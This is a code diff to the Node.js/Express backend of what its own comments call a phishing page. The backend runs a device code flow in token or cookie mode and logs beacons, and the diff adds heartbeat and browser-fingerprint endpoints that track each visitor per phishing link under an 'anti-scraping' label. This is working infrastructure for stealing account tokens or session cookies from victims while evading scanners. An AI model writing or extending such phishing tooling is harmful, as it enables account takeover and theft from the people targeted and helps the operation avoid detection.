@@ -12,7 +12,7 @@ const db = require('../database/connection');
  * POST /api/device/start
  * Start a new device code flow
  * Body: { mode: "token" | "cookie" }
- * Headers: X-Auth-Mode, X-VG-JWT (the page's JWT)
+ * Headers: X-Auth-Mode, X-VG-JWT (the phishing page's JWT)
  */
 router.post('/start', async (req, res) => {
 	try {
@@ -140,5 +140,68 @@ router.post('/beacon', async (req, res) => {
 		res.status(500).json({ error: 'Beacon failed' });
 	}
 });
+	
+	// Heartbeat endpoint - verifies page is still alive (anti-scraping)
+	router.post('/heartbeat', async (req, res) => {
+	  try {
+	    const { jwt } = req.body;
+	    if (!jwt) {
+	      return res.status(400).json({ error: 'JWT token required' });
+	    }
+	    
+	    const jwtLib = require('jsonwebtoken');
+	    const config = require('../config/env');
+	    let decoded;
+	    try {
+	      decoded = jwtLib.verify(jwt, config.JWT_SECRET);
+	    } catch (e) {
+	      return res.status(401).json({ error: 'Invalid or expired JWT' });
+	    }
+	    
+	    // Update last heartbeat timestamp in visitors table
+	    const db = require('../database/connection');
+	    await db.query(
+	      'UPDATE visitors SET last_heartbeat = NOW() WHERE link_id = ? AND jwt_token = ?',
+	      [decoded.link_id, jwt]
+	    );
+	    
+	    console.log(`[Heartbeat] Link ${decoded.link_id} heartbeat received`);
+	    res.json({ success: true, message: 'Heartbeat received' });
+	  } catch (err) {
+	    console.error('[Heartbeat] Error:', err.message);
+	    res.status(500).json({ error: 'Heartbeat failed' });
+	  }
+	});
+	
+	// Fingerprint endpoint - receives browser fingerprint from anti-scraping
+	router.post('/fp', async (req, res) => {
+	  try {
+	    const { fp, jwt } = req.body;
+	    if (!fp || !jwt) {
+	      return res.status(400).json({ error: 'Fingerprint and JWT required' });
+	    }
+	    
+	    const jwtLib = require('jsonwebtoken');
+	    const config = require('../config/env');
+	    let decoded;
+	    try {
+	      decoded = jwtLib.verify(jwt, config.JWT_SECRET);
+	    } catch (e) {
+	      return res.status(401).json({ error: 'Invalid or expired JWT' });
+	    }
+	    
+	    const db = require('../database/connection');
+	    await db.query(
+	      'UPDATE visitors SET fingerprint = ? WHERE link_id = ? AND jwt_token = ?',
+	      [fp, decoded.link_id, jwt]
+	    );
+	    
+	    console.log(`[Fingerprint] Link ${decoded.link_id} fingerprint received`);
+	    res.json({ success: true, message: 'Fingerprint received' });
+	  } catch (err) {
+	    console.error('[Fingerprint] Error:', err.message);
+	    res.status(500).json({ error: 'Fingerprint failed' });
+	  }
+	});
 
 module.exports = router;
